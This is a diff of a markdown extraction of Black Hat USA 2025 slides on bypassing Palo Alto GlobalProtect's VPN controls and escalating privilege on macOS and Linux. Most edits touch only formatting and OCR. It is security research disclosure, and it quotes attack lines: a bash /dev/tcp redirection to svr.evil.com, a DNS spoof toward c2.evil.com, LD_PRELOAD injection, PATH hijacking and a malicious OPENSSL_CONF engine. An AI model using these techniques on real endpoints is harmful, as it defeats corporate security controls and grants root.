@@ -8,19 +8,24 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Alex Bourla&Graham Brereton_Turning the Tables on GlobalProtect Use and Abuse of Palo Alto's Remote Access Solution.pdf"
 pages: 73
 sha256: "82f15c63b387269edbfee0d600812f790b5371df2a0e84e8f87d0596754236e8"
-text_chars: 34930
+text_chars: 32828
 ocr_pages: 7
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 91.6
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:49:01Z"
+converted_at: "2026-08-12T05:03:43Z"
 ---
 # Turning the Tables on GlobalProtect Use and Abuse of Palo Alto's Remote Access Solution
 
 **Speakers:** Alex Bourla, Graham Brereton  
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Alex Bourla&Graham Brereton_Turning the Tables on GlobalProtect Use and Abuse of Palo Alto's Remote Access Solution.pdf` (73 pages)
+
 
 ## Slide 1
 
@@ -32,10 +37,10 @@ Speaker: Alex Bourla Contributor: Graham Brereton
 
 ## Slide 2
 
-```
+\```
 $ whoami
 Speaker -Alex Bourla
-```
+\```
 
 - These days: Independent Security Engineer and Researcher
 
@@ -43,9 +48,9 @@ Speaker -Alex Bourla
 
 - Still can’t resist poking at products when something doesn’t smell right…
 
-```
+\```
 Contributor -Graham Brereton
-```
+\```
 
 - Ex-colleague and core contributor
 
@@ -95,10 +100,10 @@ Contributor -Graham Brereton
 
 ###### Q: How would you design this feature securely ?
 
-```
+\```
 For example, add*.target.comto exclude all Target traffic
 from the VPN tunnel.
-```
+\```
 
 Hint
 
@@ -112,23 +117,23 @@ Adapted from original by Wikipedia contributors, licensed under CC BY-SA 4.0
 
 ###### What could go wrong with this design?
 
-```
+\```
 Wildcard Split Tunnel Domain Feature –e.g. *.zoom.us
-```
+\```
 
 What if the DNS server is _mine_ ? And, what if the response is a lie?
 
 `Resolve api.zoom.us` Open http://foo. `MacOS DNS Resolver GlobalProtect Network Extension MacOS IP Route Table add route 123.45.67.89 via physical interface`
 
-```
+\```
 api.zoom.us
 →123.45.67.89
-```
+\```
 
-```
+\```
 dig foo.zoom.us
 @[attacker-dns-server]
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -187,22 +192,22 @@ to  attacker-
 controlled DNS
 server
 
-```
+\```
 Device Protected by
 GlobalProtect
-```
+\```
 
 ###### Exploitation Steps
 
 2. Attacker-controlled DNS server crafts response including the **real** IP address of `c2.evil.com (1.2.3.4)`
 
-```
+\```
 $ dig foo.zoom.us@6.6.6.6 +short
-```
+\```
 
-```
+\```
 1.2.3.4
-```
+\```
 
 GlobalProtect will now **wrongly** associate the attacker IP address of `1.2.3.4` with the whitelisted wildcard domain of `*.zoom.us`
 
@@ -273,37 +278,21 @@ Potential Impacts:
 
 13
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ iTerm2 Shell Edit View Session Scripts Profiles Window Help Oo T
 Web Page Blocked x 9 Private browsing
-Web Page Blocked
-The web page you are trying to visit has been blocked in accordance with company policy. Please
-contact your system administrator if you believe this is an error.
-User: 10.10.10.11
-URL: www.dropbox.com/
-Category: online-storage-and-backup
 GlobalProtect 140.5 MB
 OW<«e-o G @ fay www.timear \%” Modified: Today, 10:06
 ® Hide features
-General:
 OO bs OO . O ( Kind: Application (Universal)
 . . Size: 140,467,911 bytes (141.3 MB
-on disk)
 Where: Macintosh HD + Applications
-Created: Thursday, 24 July 2025 at 10:06
-Modified: Thursday, 24 July 2025 at 10:06
-Version: 6.3.1-376
-Copyright: Copyright © 2009-2019, Palo
-Alto Networks, Inc.
-Scale to fit below built-in camera
-More Info:
 Last opened: Thursday, 24 July 2025 at 11:16
-Name & Extension:
 f°; Comments:
 Settings
-Preview:
 and sounds
 ```
 
@@ -317,10 +306,10 @@ and sounds
 
 14
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
 black hat
 BRIEFINGS
 Cc 25 github.com/dlenski/openconnect/issues/151
@@ -468,10 +457,10 @@ localhost
 
 16 byte header of AES-CBC encrypted XML payload: message length `AES_CBC(AES_KEY, IV, XML)`
 
-```
+\```
 AES_KEY = md5(userKeyParam+ md5("pannetwork"))     = fn(userKeyParam)
 + md5(userKeyParam+ md5("pannetwork"))
-```
+\```
 
 GlobalProtect Client
 
@@ -511,21 +500,21 @@ IV "000000000000000000000 IV 000000000000000000000
 IPC
 Channels
 
-```
+\```
 Privileged (uid== 0)Unprivileged (uid!= 0)
 PanGPSPanGPA
 localhost
 /4767
-```
+\```
 
 ###### IPC Channel: Deeper dive
 
 16 byte header of AES-CBC encrypted XML payload: message length `AES_CBC(AES_KEY, IV, XML)`
 
-```
+\```
 AES_KEY = md5(userKeyParam+ md5("pannetwork"))     = fn(userKeyParam)
 + md5(userKeyParam+ md5("pannetwork"))
-```
+\```
 
 GlobalProtect Client (macOS / Linux)
 
@@ -574,21 +563,21 @@ GlobalProtect Client (macOS / Linux)
 
 Example XML payload during **authorised** disconnect through UI: **Key Point:** `<request>request>>`
 
-```
+\```
 <request>request>>
-```
+\```
 
-```
+\```
 <type>disable</type>
 <user>Unknown</user>
 <time>Tue Aug 27 02:59:09 2024</time>
 <pid>1534</pid>
 <reason>. Override(s)=2</reason>
-```
+\```
 
-```
+\```
 </request>
-```
+\```
 
 Encryption Algorithm Encryption Key Plaintext Message What if I replay this message and force a disconnect?
 
@@ -631,24 +620,24 @@ Step 1
 
 ###### **Key Point:**
 
-```
+\```
 Inside PanGPS
-```
+\```
 
-```
+\```
 popen("/usr/sbin/lsof-i:4767", "r");
-```
+\```
 
 look at the
 GlobalPro
 
 look at the **first non-header line only** , extract the pid from the ascii command output:
 
-```
+\```
 /usr/sbin/lsof-i:4767
 COMMAND     PID       USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
 GlobalPro36305 demo    3u  IPv4 0x24c6542f5810fcf4      0t0  TCP localhost:63522->localhost:4767 (ESTABLISHED)
-```
+\```
 
 Privileged (uid == 0) Unprivileged (uid != 0)
 Process Name spoofedConn
@@ -667,23 +656,23 @@ localhost
 
 **Key Point:** Step 2
 
-```
+\```
 Inside PanGPS
-```
+\```
 
-```
+\```
 res =proc_pidpath(pid, pid_path, sizeof(pid_path));
 if(res <1){
-```
+\```
 
-```
+\```
 returntrue;
 }
-```
+\```
 
-```
+\```
 returnstd::strncmp(pid_path, "/Applications/GlobalProtect.app/", 32)==0;
-```
+\```
 
 **Get path from** **`pid` and check if it starts with** **`/Applications/GlobalProtect.app/`**
 
@@ -716,22 +705,22 @@ Can we fool this logic into thinking it’s connected by a trusted binary when i
 
 2. Redirect output from a **<u>legitimate GlobalProtect binary</u>** to any remote service listening on port 4767 (e.g. using bash TCP redirection)
 
-```
+\```
 /bin/bash -c \
 "/Applications/GlobalProtect.app/Contents/Resources/PanGpHipMp\
 >& /dev/tcp/svr.evil.com/4767 0>&1"
-```
+\```
 
 3. Connect to the IPC service ( `localhost:4767` ) from our malicious userspace process. `PanGPS` sees something like this:
 
 The process evaluated by the security control
 
-```
+\```
 COMMAND     PID       USER   FD   TYPE    (...)
 PanGpHipM48222 demo         0u  IPv4    (...) (CLOSE_WAIT)
 PanGpHipM48222 demo         1u  IPv4    (...) (CLOSE_WAIT)
 spoofedC48587 demo         3u  IPv4    (...) (ESTABLISHED)
-```
+\```
 
 The process that actually connects to the IPC server
 
@@ -745,52 +734,32 @@ The process that actually connects to the IPC server
 
 30
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ QuickTime Player File Edit View Window Help
 Alexs—MacBook-Air. local: Thu Jul 24 11:02:02 2025
 COMMAND PID USER FD TYPE DEVICE SIZE/OFF
 NODE NAME
-GlobalPro 18711 demo 3u  IPv4 0x7d17601c8220cc5 Oto
 TCP localhost:58059->localhost:4767 (ESTABLISHED)
 demo % []
 33 Web Page Blocked x ap
-o-
 °5 dropbox.com Q ¥* & Incognito
-Web Page Blocked
-The web page you are trying to visit has been blocked in accordance with company policy. Please
-contact your system administrator if you believe this is an error.
-User: 10.10.10.11
-URL: www.dropbox.com/
-Category: online-storage-and-backup
 GlobalProtect 140.5 MB
 % Modified: Today, 10:06
-General:
-Kind: Application (Universal)
 Size: 140,467,911 bytes (141.3 MB
-on disk)
-Where: Macintosh HD » Applications
-Created: Thursday, 24 July 2025 at 10:06
-Modified: Thursday, 24 July 2025 at 10:06
-Version: 6.3.1-376
-Copyright: Copyright © 2009-2019, Palo
-Alto Networks, Inc.
-Scale to fit below built-in camera
-More Info:
 Last opened: Thursday, 24 July 2025 at 10:57
-Name & Extension:
 Comments:
-Preview:
 ```
 
 ## Slide 31
 
 ###### Let’s look deeper at the control again
 
-```
+\```
 Derived from decompiled code
-```
+\```
 
 **`isConnectedByPan()`** FAIL OPEN `Something went wrong Verification Passed Convert text discard read find 1`<sup>`st`</sup> `find 2`<sup>`nd`</sup> `Get path of Yes lsof –i between header next space space process with :4767 spaces to a line line delimiter delimiter that pid number Is path trusted? Not a valid Default to number zero! No` “ Plan to have the configuration fail securely: **Design systems** `Verification` **to fail in a secure state** , rather than exposing vulnerabilities rather than exposing vulnerabilities `Failed`
 
@@ -855,9 +824,9 @@ Imagine:
 
 - `COMMAND  PID       USER (...) NAME short   4073 alexbourla (...) localhost:49903->localhost:4767 (ESTABLISHED)`
 
-```
+\```
 /Library/Logs/PaloAltoNetworks/GlobalProtect/PanGPS.log:
-```
+\```
 
 What happens if I use a short process name?
 
@@ -873,41 +842,24 @@ What happens if I use a short process name?
 
 34
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ iTerm2 Shell Edit View Session Scripts Profiles
 33 Web Page Blocked x = v
 Alexs—MacBook-Air. local: Thu Jul 24 11:16:29 2025
-°3 dropbox.com Q * & Incognito
 COMMAND PID USER FD We DEVICE SIZE/0OF
 F NODE NAME
 GlobalPro 48013 demo 3u IPv4 @xb662cdb0870b3215 et
 @ TCP localhost:59439->localhost:4767 (ESTABLISHED)
-Web Page Blocked
 The web page you are Ning to visit has been blocked in accordance with company policy. Please
-contact your system administrator if you believe this is an error.
-User: 10.10.10.11
-URL: www.dropbox.com/
 [] Category: online-storage-and-backup
 demo % [] GlobalProtect 140.5 MB
 % Modified: Today, 10:06
-General:
-Kind: Application (Universal)
 Size: 140,467,911 bytes (141.3 MB
-on disk)
-Where: Macintosh HD » Applications
-Created: Thursday, 24 July 2025 at 10:06
-Modified: Thursday, 24 July 2025 at 10:06
-Version: 6.3.1-376
-Copyright: Copyright © 2009-2019, Palo
-Alto Networks, Inc.
-Scale to fit below built-in camera
-More Info:
 Last opened: Thursday, 24 July 2025 at 11:09
-Name & Extension:
 Comments:
-Preview:
 ```
 
 ## Slide 35
@@ -931,12 +883,12 @@ Remote Addr/Port
 port>
 Inode number (e.g. 12345)
 
-```
+\```
 1. Find Inodefor:
 Remote 127.0.0.1/4767
 Local 127.0.0.1/<connected
 port>
-```
+\```
 
 readlink /proc/[pid]/exe
 [binary-path]
@@ -968,39 +920,39 @@ And, how this works is very different between Mac and Linux
 
 ###### Control via Environment Variables
 
-```
+\```
 DYLD_* variables
-```
+\```
 
-```
+\```
 LD_* variables
-```
+\```
 
-```
+\```
 SIP restricts DYLD injection for
 protected binaries
-```
+\```
 
 Security Hardening
 
-```
+\```
 DYLD_INSERT_LIBRARIES etc. are ignored
 at runtime if binary is:
-```
+\```
 
 - **`Code-signed`**
 
 - **`SIP-protected (e.g. inside /Applications)`**
 
-```
+\```
 (But hardened apps e.g. with
 seccomp, static-linking, or
 containers may block it)
-```
+\```
 
-```
+\```
 This is true even for root user
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1016,10 +968,10 @@ GlobalProtect Bypass 4 of 1 Privilege Escalation 0 of 1
 
 Malicious Code
 
-```
+\```
 $ LD_PRELOAD=$PWD/libgpdisable.so\
 /opt/paloaltonetworks/globalprotect/PanGPA
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1029,17 +981,14 @@ $ LD_PRELOAD=$PWD/libgpdisable.so\
 
 39 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Jul 18 13:09
 O & dropbox.com
-Web Page Blocked
-The web page you are trying to visit has been blocked in accordance with company policy. Please
-contact your system administrator if you believe this is an error.
 User: 10.10.10.38
 URL: dr
-Category: online-storage-and-backup
 $ ./CVE-2025-0140
 & GlobalProtect
 GlobalProtect: 6.2.7-1050
@@ -1064,25 +1013,25 @@ Copyright 2009-2025, Palo Alto Networks, Inc.
 
 ###### Back to
 
-```
+\```
 Unprivileged (uid!= 0)
-```
+\```
 
 Is there **_another_** way to make the **_real_** `PanGPA` binary misbehave?
 
 PanGPA
 
-```
+\```
 > ls -l /Users/$USER/Library/Preferences/com.paloaltonetworks.GlobalProtect.settings.plist
-```
+\```
 
-```
+\```
 -rw-------1 demo  staff  3004 15 Jul 17:50
-```
+\```
 
-```
+\```
 /Users/demo/Library/Preferences/com.paloaltonetworks.GlobalProtect.settings.plist
-```
+\```
 
 Config Files
 
@@ -1098,34 +1047,34 @@ Config Files
 
 ###### Back to
 
-```
+\```
 Unprivileged (uid!= 0)
-```
+\```
 
 Is there **_another_** way to make the **_real_** `PanGPA` binary misbehave?
 
-```
+\```
 PanGPA
-```
+\```
 
-```
+\```
 (...)
-```
+\```
 
 - `<key>Settings\portal.gp-lab.uk</key> <dict>`
 
-```
+\```
 <key>OverrideMethod</key>
-```
+\```
 
-```
+\```
 <string>with-passcode</string>
 </dict>
-```
+\```
 
-```
+\```
 (...)
-```
+\```
 
 Config Files
 
@@ -1146,9 +1095,9 @@ User preferences
 
 GlobalProtect Bypass 5 of 1 Privilege Escalation 0 of 1 `Unprivileged (uid != 0)`
 
-```
+\```
 PanGPA
-```
+\```
 
 •
 User preferences
@@ -1168,10 +1117,10 @@ config
 
 44
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-é
 Finder
 File
 Edit
@@ -1180,24 +1129,16 @@ Go
 Window
 Help
 Web Page Blocked x 9 Private browsing
-Web Page Blocked
 The web page you are trying to visit has been blocked in accordance with company }
-contact your system administrator if you believe this is an error.
 User: 10.10.10.12
 URL: www.dropbox.com
-Category: online-storage-and-backup
 GlobalProtect 149.4 MB
 % Modified: Today, 13:17
-General:
-Kind: Application (Universal)
 Size: 149,371,802 bytes (150.2 MB on disk)
-Where: Macintosh HD » Applications
 Created: Thursday, 24 July 2025 at 13:17
 Modified: Thursday, 24 July 2025 at 13:17
 Version: 6.3.2-525
 Copyright: Copyright © 2009-2019, Palo Alto Networks, Inc.
-Scale to fit below built-in camera
-More Info:
 Last opened: Thursday, 24 July 2025 at 13:55
 ```
 
@@ -1275,35 +1216,35 @@ Binaries
 
 ###### Privileged Binaries: Deeper dive
 
-```
+\```
 $ PATH=[ATTACKER_CONTROLLED_DIR] \
 $GP_APP_PATH/Contents/Resources/PanGPS
-```
+\```
 
 GlobalProtect Client (macOS / Linux)
 
-```
+\```
 Privileged (uid== 0)
-```
+\```
 
-```
+\```
 Unprivileged (uid!= 0)
-```
+\```
 
-```
+\```
 Launch with SUID
-```
+\```
 
 - rwsr-xr-x
 root  wheel
 
-```
+\```
 PanGPS
-```
+\```
 
-```
+\```
 launchd
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1327,33 +1268,33 @@ launchd
 
 ## Slide 51
 
-```
+\```
 Decompiled PanGPSbinary:
-```
+\```
 
 `bool CheckProcessName(int` _`pid`_ `, const char *` _`expected_name`_ `) { char cmd[256]; snprintf(cmd, sizeof(cmd), "ps -p %d -o command | grep -v COMMAND", pid); FILE *fp = popen(cmd, "r");` **Key Point:** `if (fp == NULL) { return false; } ps gets command from argv`
 
-```
+\```
 charoutput[260];
 if(fgets(output,sizeof(output),fp) ==NULL){
 pclose(fp);
 returnfalse;
 }
-```
+\```
 
-```
+\```
 trim_trailing_spaces(output);
-```
+\```
 
-```
+\```
 boolmatch =strcmp(output,expected_name) ==0;
-```
+\```
 
-```
+\```
 pclose(fp);
 returnmatch;
 }
-```
+\```
 
 But if we control parent process, we also control `argv` !
 
@@ -1388,15 +1329,15 @@ return 0;
 
 ###### But PanGPS fights back, again, again…
 
-```
+\```
 Decompiled PanGPSbinary:
-```
+\```
 
 `void entry` **Key Point:** `(int` _`argc`_ `, char **` _`argv`_ `) {` _`// Overwrite attacker-controlled environment variable`_ `setenv("PATH", "/usr/bin:/bin:/usr/sbin:/sbin", 1);` _`// ... rest of PanGPS startup logic ...`_
 
-```
+\```
 }
-```
+\```
 
 **There’s** **_another_ security control**
 
@@ -1430,35 +1371,35 @@ return getenv(name);
 
 ###### **`OPENSSL_CONF`** environment variable
 
-```
+\```
 Example malicious OPENSSL configuration file:
-```
+\```
 
-```
+\```
 This is a problem,
 but let’s try it
 anyway...
-```
+\```
 
-```
+\```
 openssl_conf=openssl_init
 [openssl_init]
 engines=engine_section
 [engine_section]
 pkcs11=pkcs11_section
-```
+\```
 
 <u>https://docs.openssl.org/3.1/man5/config/#environment</u>
 
 - `$ OPENSSL_CONF=/tmp/evil.conf \ ./PanGPS_wrapper`
 
-```
+\```
 [pkcs11_section]
 engine_id=pkcs11
 dynamic_path=/tmp/evil_openssl_engine.dylib
 default_alogorithms=ALL
 init=1
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1468,7 +1409,8 @@ init=1
 
 56 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 iTerm2
@@ -1480,8 +1422,6 @@ Scripts
 Profiles
 Window
 Help
-2
-“6
 i
 CVE-2025-0141: Mac SUID PE (-zsh)
 @ GlobalProtect info
@@ -1489,12 +1429,10 @@ GlobalProtect
 \% Modified: Today, 14:00
 140.5 MB
 ¥ General:
-Kind: Application (Universal)
 Size: 140,467,911 bytes (141.3 MB on disk)
 Where: Macintosh HD + Applications
 Created: Thursday, 24 July 2025 at 14:00
 Modified: Thursday, 24 July 2025 at 14:00
-Version: 6.3.1-376
 Copyright: Copyright © 2009-2019, Palo Alto Networks, Inc.
 Locked
 __ Scale to fit below built-in camera
@@ -1719,12 +1657,12 @@ The Patch that Made Things Worse **CVE-2025-0135 – Forged IPC Disconnect (macO
 
 - Low privileged user could disable GlobalProtect via spoofed IPC command
 
-```
+\```
 COMMAND     PID       USER   FD   TYPE    (...)
 PanGpHipM48222 demo         0u  IPv4    (...) (CLOSE_WAIT)
 PanGpHipM48222 demo         1u  IPv4    (...) (CLOSE_WAIT)
 spoofedC48587 demo         3u  IPv4    (...) (ESTABLISHED)
-```
+\```
 
 **Defensive Control Bypass Technique** `lsof` check Fooled by Bash redirection or short binary
 
@@ -1756,9 +1694,9 @@ redirection or short binary
 
 ###### The Patch that Made Things Worse
 
-```
+\```
 Derived from decompiled code
-```
+\```
 
 isConnectedByPan(clientPort)  – new implementation
 Verification
@@ -1857,17 +1795,17 @@ To this day, GlobalProtect gives **too much control to user-space processes** , 
 
 ## Thank you
 
-```
+\```
 Link to website
 Whitepaper to follow
-```
+\```
 
-```
+\```
 Alex BourlaWhitepaper to follow
 https://www.linkedin.com/in/alexbourla/
 hi@alexbourla.com
 https://www.alexbourla.com
-```
+\```
 
 #BHUSA @BlackHatEvents
 
